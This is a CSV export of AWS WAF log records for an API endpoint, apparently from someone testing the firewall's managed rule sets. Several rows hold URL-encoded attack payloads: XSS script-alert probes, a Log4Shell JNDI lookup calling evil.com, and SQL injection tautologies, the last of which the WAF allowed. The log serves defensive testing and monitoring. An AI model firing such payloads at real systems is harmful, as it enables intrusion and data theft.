"event_id","action","args","country","event_epoch","method","rule","rule_type","source_ip","timestamp","uri","web_acl_id"
"39830240336561846115543506329918112789848344657150017536","BLOCK","name=%3Cscript%3Ealert(6)%3C%2Fscript%3E","US","1786049747","GET","AWSManagedRulesCommonRuleSet","MANAGED_RULE_GROUP","75.24.108.158","2026-08-06T20:55:47.754000+00:00","/prod/python","arn:aws:wafv2:us-east-1:975598471165:regional/webacl/token-api-waf/8231539d-8f10-474d-b7ec-973bc40f9cf9"
"39824805224587917210381373220181607983838668263932297216","ALLOW","name=Chewbacca","US","1785806028","GET","Default_Action","REGULAR","75.24.108.158","2026-08-04T01:13:48.904000+00:00","/prod/python","arn:aws:wafv2:us-east-1:975598471165:regional/webacl/token-api-waf/8231539d-8f10-474d-b7ec-973bc40f9cf9"
"39830240364638484320493560869919913059442927265375715328","BLOCK","name=%3Cscript%3Ealert(9)%3C%2Fscript%3E","US","1786049749","GET","AWSManagedRulesCommonRuleSet","MANAGED_RULE_GROUP","75.24.108.158","2026-08-06T20:55:49.013000+00:00","/prod/python","arn:aws:wafv2:us-east-1:975598471165:regional/webacl/token-api-waf/8231539d-8f10-474d-b7ec-973bc40f9cf9"
"39830240309912455603299411678115367942577448127738216448","BLOCK","name=%3Cscript%3Ealert(3)%3C%2Fscript%3E","US","1786049746","GET","AWSManagedRulesCommonRuleSet","MANAGED_RULE_GROUP","75.24.108.158","2026-08-06T20:55:46.559000+00:00","/prod/python","arn:aws:wafv2:us-east-1:975598471165:regional/webacl/token-api-waf/8231539d-8f10-474d-b7ec-973bc40f9cf9"
"39830249639808322076960624040805680094332876846633058304","BLOCK","name=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D","US","1786050164","GET","AWSManagedRulesKnownBadInputsRuleSet","MANAGED_RULE_GROUP","75.24.108.158","2026-08-06T21:02:44.926000+00:00","/prod/python","arn:aws:wafv2:us-east-1:975598471165:regional/webacl/token-api-waf/8231539d-8f10-474d-b7ec-973bc40f9cf9"
"39830249016435591542434115328199464462239956894323310592","ALLOW","name=%27%20OR%20%271%27%3D%271","US","1786050136","GET","Default_Action","REGULAR","75.24.108.158","2026-08-06T21:02:16.973000+00:00","/prod/python","arn:aws:wafv2:us-east-1:975598471165:regional/webacl/token-api-waf/8231539d-8f10-474d-b7ec-973bc40f9cf9"
"39824805222803857594498923372608639441986694331093614592","ALLOW","name=Chewbacca","US","1785806028","GET","Default_Action","REGULAR","75.24.108.158","2026-08-04T01:13:48.824000+00:00","/prod/python","arn:aws:wafv2:us-east-1:975598471165:regional/webacl/token-api-waf/8231539d-8f10-474d-b7ec-973bc40f9cf9"
"39824805223294473988866597086211446721928478715458813952","ALLOW","name=Chewbacca","US","1785806028","GET","Default_Action","REGULAR","75.24.108.158","2026-08-04T01:13:48.846000+00:00","/prod/python","arn:aws:wafv2:us-east-1:975598471165:regional/webacl/token-api-waf/8231539d-8f10-474d-b7ec-973bc40f9cf9"
"39830240345928159098926368053150629289648993579505221632","BLOCK","name=%3Cscript%3Ealert(7)%3C%2Fscript%3E","US","1786049748","GET","AWSManagedRulesCommonRuleSet","MANAGED_RULE_GROUP","75.24.108.158","2026-08-06T20:55:48.174000+00:00","/prod/python","arn:aws:wafv2:us-east-1:975598471165:regional/webacl/token-api-waf/8231539d-8f10-474d-b7ec-973bc40f9cf9"
"39824805222491647161719494651398348619147920130672492544","ALLOW","name=Chewbacca","US","1785806028","GET","Default_Action","REGULAR","75.24.108.158","2026-08-04T01:13:48.810000+00:00","/prod/python","arn:aws:wafv2:us-east-1:975598471165:regional/webacl/token-api-waf/8231539d-8f10-474d-b7ec-973bc40f9cf9"
"39830249043798605901031189925377067832868511418047266816","ALLOW","name=%27%20OR%20%273%27%3D%273","US","1786050138","GET","Default_Action","REGULAR","75.24.108.158","2026-08-06T21:02:18.200000+00:00","/prod/python","arn:aws:wafv2:us-east-1:975598471165:regional/webacl/token-api-waf/8231539d-8f10-474d-b7ec-973bc40f9cf9"
"39824805226260473100271169956152075691697532876372508672","ALLOW","name=Chewbacca","US","1785806028","GET","Default_Action","REGULAR","75.24.108.158","2026-08-04T01:13:48.979000+00:00","/prod/python","arn:aws:wafv2:us-east-1:975598471165:regional/webacl/token-api-waf/8231539d-8f10-474d-b7ec-973bc40f9cf9"
"39830249057424361217333400664921096706437784553941041152","ALLOW","name=%27%20OR%20%274%27%3D%274","US","1786050138","GET","Default_Action","REGULAR","75.24.108.158","2026-08-06T21:02:18.811000+00:00","/prod/python","arn:aws:wafv2:us-east-1:975598471165:regional/webacl/token-api-waf/8231539d-8f10-474d-b7ec-973bc40f9cf9"
"39824805224810924662366679449119907174730998621313040384","ALLOW","name=Chewbacca","US","1785806028","GET","Default_Action","REGULAR","75.24.108.158","2026-08-04T01:13:48.914000+00:00","/prod/python","arn:aws:wafv2:us-east-1:975598471165:regional/webacl/token-api-waf/8231539d-8f10-474d-b7ec-973bc40f9cf9"
